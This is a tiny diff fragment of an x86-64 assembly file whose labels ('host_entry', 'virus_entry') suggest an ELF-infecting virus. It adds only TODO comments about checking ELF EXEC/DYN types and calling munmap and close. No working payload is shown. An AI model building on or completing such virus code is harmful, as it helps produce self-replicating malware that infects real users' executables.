@@ -257,3 +257,7 @@ host_entry	dq		_exit
 virus_entry	dq		_start
 _finish:
 
+
+; TODO :
+; Add a check for EXEC or DYN type of x64
+; Call munmap and close
